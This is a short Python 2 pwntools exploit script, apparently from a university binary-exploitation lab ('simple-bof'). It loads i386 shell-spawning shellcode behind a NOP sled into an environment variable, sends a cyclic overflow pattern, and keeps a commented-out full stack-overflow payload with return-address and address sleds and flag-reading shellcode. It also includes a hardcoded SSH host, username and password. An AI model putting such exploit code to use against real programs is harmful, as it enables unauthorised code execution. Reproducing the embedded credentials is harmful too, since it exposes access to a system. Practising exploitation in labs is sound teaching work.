#!/usr/bin/env python2

from pwn import *

exe = "./target"
mydir = "simple-bof"
path = "/home/lab03/" + mydir

context.terminal = ['tmux', 'splitw', '-v']
context.update(arch='i386', os='linux')

env = {"SHELLCODE": "\x90"*0x1000 + asm(pwnlib.shellcraft.i386.linux.sh())}
payload = cyclic(1024)
p = process(["./target", payload], env=env)
p.interactive()

'''
# Address to use
start_addr = local

# Padding
padding = 0x61706161

# NOP sled
nop_sled = "\x90" * 100

shellcode = shellcraft.cat("/tmp/flag")
payload  = cyclic(cyclic_find(padding))
payload += p32(start_addr)
payload += nop_sled
payload += asm(shellcode)

# Address sled
for i in range (0, 200):
    payload += p32(start_addr)

# connect to our server
#s = ssh("lab03", "52.201.10.159", password="b50e289f")
#p = s.process(exe, cwd=path)

# Local
#p = process("./crackme0x00", cwd="/home/jakeholl/git/cs6265/lab03/tut03-pwntool")
'''
# Local debug
#p = gdb.debug(exe, ''' continue ''')
'''
p.sendline(payload)
p.interactive()
'''
